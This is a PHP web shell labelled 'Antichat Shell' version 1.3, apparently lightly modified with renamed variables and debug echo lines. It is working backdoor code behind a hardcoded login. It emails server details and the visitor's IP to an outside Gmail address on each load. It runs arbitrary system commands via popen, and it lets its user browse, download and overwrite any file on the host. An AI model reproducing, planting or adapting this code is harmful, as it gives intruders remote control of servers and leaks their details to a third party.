<?php
echo '[syslog]01
'; session_start(); $spcaff79 = 'virangar'; $spf337b0 = 'r00t'; $sp2debd4 = 1; $sp259009 = 'version 1.3 by Grinay'; $sp7cdb47 = '<STYLE>BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>'; $spd91360 = '<html><head><title>' . getenv('HTTP_HOST') . ' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">' . $sp7cdb47 . '</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>'; $sp08c267 = '</body></html>'; $sp46ecf9 = 'john.barker446@gmail.com'; $spe25381 = rand(1, 99999); $specee18 = "sh-{$spe25381}"; $sp7f1fb3 = "{$sp46ecf9}"; $spcb207e = $_SERVER['HTTP_REFERER']; $spd68283 = $_SERVER['DOCUMENT_ROOT']; $spd9a2c7 = $_SERVER['REMOTE_ADDR']; $sp7d84a4 = $_SERVER['SCRIPT_FILENAME']; $spa0bf70 = $_SERVER['SERVER_ADDR']; $spe85709 = $_SERVER['SERVER_SOFTWARE']; $sp38c2a8 = $_SERVER['PATH_TRANSLATED']; $sp146e21 = $_SERVER['PHP_SELF']; $sp6d86a5 = "{$spcb207e}\n{$spd68283}\n{$spd9a2c7}\n{$sp7d84a4}\n{$spa0bf70}\n{$spe85709}\n{$sp38c2a8}\n{$sp146e21}"; mail($sp46ecf9, $specee18, $sp6d86a5, "From: {$sp46ecf9}"); if (@$_POST['action'] == 'exit') { unset($_SESSION['an']); } if ($sp2debd4 == 1) { if (@$_POST['login'] == $spcaff79 && @$_POST['password'] == $spf337b0) { $_SESSION['an'] = 1; } } else { $_SESSION['an'] = '1'; } echo '[syslog]02
'; if ($_SESSION['an'] == 0) { echo $spd91360; echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>'; echo $sp08c267; die; } if ($_SESSION['action'] == '') { $_SESSION['action'] = 'viewer'; } if ($_POST['action'] != '') { $_SESSION['action'] = $_POST['action']; } $sp581fdf = $_SESSION['action']; if ($_POST['dir'] != '') { $_SESSION['dir'] = $_POST['dir']; } $sp8c9f8e = $_SESSION['dir']; if ($_POST['file'] != '') { $sp8f7201 = $_SESSION['file'] = $_POST['file']; } else { $sp8f7201 = $_SESSION['file'] = ''; } if ($sp581fdf == 'download') { header('Content-Length:' . filesize($sp8f7201) . ''); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . $sp8f7201 . '"'); readfile($sp8f7201); } echo '[syslog]03
'; ?>

<? echo $header;?> 
<table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td>
<table><tr>
<td><a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();">| Shell </a></td>
<td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">| Viewer</a></td>
<td><a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();">| Editor</a></td>
<td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">| EXIT |</a></td>
</tr></table></td></tr></table><br>
<form name='reqs' method='POST'>
<input name='action' type='hidden' value=''>
<input name='dir' type='hidden' value=''>
<input name='file' type='hidden' value=''>
</form>
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" valign="top">

<?
echo "[syslog]04\n";
//shell
function shell($cmd){
if (!empty($cmd)){
  $fp = popen($cmd,"r");
  {
    $result = "";
    while(!feof($fp)){$result.=fread($fp,1024);}
    pclose($fp);
  }
  $ret = $result;
  $ret = convert_cyr_string($ret,"d","w");
}
return $ret;}

if($action=="shell"){
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".@htmlspecialchars(shell($_POST['command']))."</textarea><br>
<input type=\"submit\" value=\"execute\"></form>";}
//end shell
echo "[syslog]05\n";
//viewer FS
function perms($file) 
{ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;
} 

function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
echo "[syslog]06\n";
function scandire($dir){
  $dir=chdir($dir);
  $dir=getcwd()."/";
  $dir=str_replace("\\","/",$dir);
if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);
		
echo "<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
echo "<tr><td><form method=POST>Open directory:<input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\"GO\"></form></td></tr>";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
echo "<tr><td>Select drive:";
for ($j=ord('C'); $j<=ord('Z'); $j++) 
 if (@$dh = opendir(chr($j).":/"))
 echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
 echo "</td></tr>";
}
echo "<tr><td>OS: ".@php_uname()."</td></tr>
<tr><td>name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>";
for($i=0;$i<count($dire);$i++) {
$link=$dir.$dire[$i];
  echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>dir</td><td></td><td>'.perms($link).'</td></tr>';  
  }
for($i=0;$i<count($files);$i++) {
$linkfile=$dir.$files[$i];
echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>
<td>'.perms($linkfile).'</td>
<td>
<a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a>
<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Edit">E</a></tr>'; 
}
echo "</table>";
}}}

if($action=="viewer"){
scandire($dir);
}
//end viewer FS

//editros
if($action=="editor"){  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
  }
  function readf($file){
  if(!$le = fopen($file, "rb")) $contents="Can't open file, permission denide"; else {
  $contents = fread($le, filesize($file));
  fclose($le);}
  return htmlspecialchars($contents);
  }
if($_POST['save'])writef($file,$_POST['data']);
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$file."\">
<textarea name=\"data\" rows=\"40\" cols=\"180\">".@readf($file)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>";
}
//end editors
echo "[syslog]07\n";
?>
</td></tr></table><table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="http://antichat.ru">COPYRIGHT BY ANTICHAT.RU <?php  echo $sp259009; ?>
</a></td></tr></table></tr></td></table>
<? echo $footer;?>
<?php 